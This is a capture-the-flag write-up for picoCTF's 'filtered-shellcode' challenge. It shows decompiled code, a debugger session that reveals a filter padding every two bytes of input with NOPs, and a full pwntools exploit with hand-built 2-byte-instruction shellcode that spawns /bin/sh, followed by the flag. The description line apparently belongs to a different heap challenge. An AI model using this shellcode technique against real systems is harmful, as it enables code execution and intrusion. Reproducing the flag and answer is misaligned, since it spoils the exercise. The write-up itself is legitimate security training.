# filtered-shellcode

## Description

Author: madStacks

While being super relevant with my meme references, I wrote a program to see how much you understand heap allocations. nc mercury.picoctf.net 34499 heapedit Makefile libc.so.6

## Challenge

The program takes shellcode as user input, applies a filter, then executes the code.

### Mitigations

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

### Decompiled code

```c
void sym.execute(uint32_t arg_8h, uint32_t arg_ch)
{
    int32_t iVar1;
    int32_t iVar2;
    uint32_t uVar3;
    undefined4 *puVar4;
    undefined4 auStack60 [3];
    undefined4 uStack48;
    undefined auStack44 [8];
    int32_t var_20h;
    int32_t var_1ch;
    int32_t var_18h;
    uint32_t var_14h;
    int32_t var_10h;
    int32_t var_ch;
    int32_t var_4h;
    
    puVar4 = (undefined4 *)auStack44;
    uStack48 = 0x8048502;
    sym.__x86.get_pc_thunk.ax();
    if ((arg_8h == 0) || (arg_ch == 0)) {
        puVar4 = auStack60;
        auStack60[0] = 1;
        sym.imp.exit();
    }
    var_14h = arg_ch * 2;
    var_18h = var_14h;
    iVar1 = ((var_14h + 0x10) / 0x10) * -0x10;
    var_1ch = (int32_t)((int32_t)puVar4 + iVar1);
    var_10h = 0;
    for (var_ch = 0; iVar2 = var_10h, (uint32_t)var_ch < var_14h; var_ch = var_ch + 1) {
        uVar3 = (uint32_t)(var_ch >> 0x1f) >> 0x1e;
        if ((int32_t)((var_ch + uVar3 & 3) - uVar3) < 2) {
            var_10h = var_10h + 1;
            *(undefined *)((int32_t)puVar4 + var_ch + iVar1) = *(undefined *)(arg_8h + iVar2);
        } else {
            *(undefined *)((int32_t)puVar4 + var_ch + iVar1) = 0x90;
        }
    }
    *(undefined *)((int32_t)puVar4 + var_14h + iVar1) = 0xc3;
    var_20h = (int32_t)((int32_t)puVar4 + iVar1);
    *(undefined4 *)((int32_t)puVar4 + iVar1 + -4) = 0x80485cb;
    (*(code *)((int32_t)puVar4 + iVar1))();
    return;
}

undefined4 main(void)
{
    int32_t unaff_EBX;
    char acStack1021 [4];
    int32_t var_3f5h;
    char cStack21;
    uint32_t uStack20;
    uint32_t var_ch;
    int32_t var_8h;
    
    var_ch = (uint32_t)&stack0x00000004;
    sym.__x86.get_pc_thunk.bx();
    sym.imp.setbuf(**(undefined4 **)(unaff_EBX + 0x1a0f), 0);
    uStack20 = 0;
    cStack21 = 0;
    sym.imp.puts(unaff_EBX + 0x153);
    cStack21 = sym.imp.fgetc(**(undefined4 **)(unaff_EBX + 0x1a0b));
    for (; (cStack21 != '\n' && (uStack20 < 1000)); uStack20 = uStack20 + 1) {
        acStack1021[uStack20] = cStack21;
        cStack21 = sym.imp.fgetc(**(undefined4 **)(unaff_EBX + 0x1a0b));
    }
    if ((uStack20 & 1) != 0) {
        acStack1021[uStack20] = -0x70;
        uStack20 = uStack20 + 1;
    }
    sym.execute((uint32_t)acStack1021, uStack20);
    return 0;
}
```

## Solution

The important part of the filter is here:

```c
    for (var_ch = 0; iVar2 = var_10h, (uint32_t)var_ch < var_14h; var_ch = var_ch + 1) {
        uVar3 = (uint32_t)(var_ch >> 0x1f) >> 0x1e;
        if ((int32_t)((var_ch + uVar3 & 3) - uVar3) < 2) {
            var_10h = var_10h + 1;
            *(undefined *)((int32_t)puVar4 + var_ch + iVar1) = *(undefined *)(arg_8h + iVar2);
        } else {
            *(undefined *)((int32_t)puVar4 + var_ch + iVar1) = 0x90;
        }
    }
```

We can see that, if a condition is not met, the program will input a NOP instead of our shellcode.
Note that our shellcode is not overwritten by this, but these NOP instructions can break up our instructions if they are more than 1 byte long.

It is easiest to determine how this filter works using a debugger.

Let's set a breakpoint just before the code is executed:

```
   0x080485c3 <+205>:   mov    DWORD PTR [ebp-0x20],eax
   0x080485c6 <+208>:   mov    eax,DWORD PTR [ebp-0x20]
   0x080485c9 <+211>:   call   eax
   0x080485cb <+213>:   mov    esp,ebx
   0x080485cd <+215>:   nop
   0x080485ce <+216>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x080485d1 <+219>:   leave
   0x080485d2 <+220>:   ret
End of assembler dump.
pwndbg> b*0x080485c9
Breakpoint 1 at 0x80485c9
pwndbg> r
Starting program: /home/user/Documents/ctf/filtered/fun
pwndbg> Give me code to run:

Program received signal SIGTTIN, Stopped (tty input).
0xf7fc9549 in __kernel_vsyscall ()
```

We'll use something easily recognisable for our input:

```
pwndbg> c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

And print the stack once we hit our breakpoint:

```
Breakpoint 1, 0x080485c9 in execute ()
pwndbg> tel 50
00:0000│ eax ecx edx esp  0xffffce90 ◂— 0x90904141
... ↓
29:00a4│                  0xffffcf34 ◂— 0x90909041
2a:00a8│                  0xffffcf38 ◂— 0xc3
2b:00ac│                  0xffffcf3c —▸ 0x8048502 (execute+12) ◂— add    eax, 0x1afe
2c:00b0│ ebx              0xffffcf40 —▸ 0xf7f9d580 (__GI__IO_file_jumps) ◂— 0x0
2d:00b4│                  0xffffcf44 —▸ 0x80483e0 (_start) ◂— xor    ebp, ebp
2e:00b8│                  0xffffcf48 —▸ 0xffffce90 ◂— 0x90904141
... ↓
30:00c0│                  0xffffcf50 ◂— 0xa8
... ↓
```

We can see that there is a large repeating part of the stack, where each dword is `0x90904141`.
So our shellcode is being printed in 2 byte chunks, followed by 2 nops.
This means that our shellcode cannot use instructions longer than 2 bytes.

I based by shellcode on this example by Jean Pascal Pereira:
http://shell-storm.org/shellcode/files/shellcode-811.php

For the most part, this just means we have to split instructions into 2-byte chunks and space them with nops where necessary.

An issue arises when trying to push strings onto the stack, such as `/bin/sh`, which is typically used in the syscall to spawn a shell.
To solve this, we can add a single byte into `EAX`, then use the bitwise shift instructions to shift by 1 bit.
Doing this 8 times will shift the register contents by 1 byte, allowing us to add the next byte.
Repeating this for every byte, we can print entire strings onto the stack.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 28494 fun
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fun')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 28494)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
context.terminal = ['tmux', 'splitw', '-h']
gdbscript = '''
b*0x080485c9
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

shellcode = b''

# push /bin/sh\0
shellcode += b'\x31\xc0'
shellcode += b'\x50\x90'

shellcode += b'\x04\x68'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x73'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x2f'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x2f'
shellcode += b'\x50\x90'

shellcode += b'\x31\xc0'
shellcode += b'\x04\x6e'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x69'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x62'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x2f'
shellcode += b'\x50\x90'

shellcode += b'\x31\xc0'
shellcode += b'\x89\xe3'
shellcode += b'\x89\xc1'
shellcode += b'\x89\xc2'

shellcode += b'\xb0\x0b'
shellcode += b'\xcd\x80'
shellcode += b'\x31\xc0'
shellcode += b'\x40\x90'
shellcode += b'\xcd\x80'

io.sendline(shellcode)

io.interactive()
```

## Flag

`picoCTF{th4t_w4s_fun_384f7c52706306d0}`

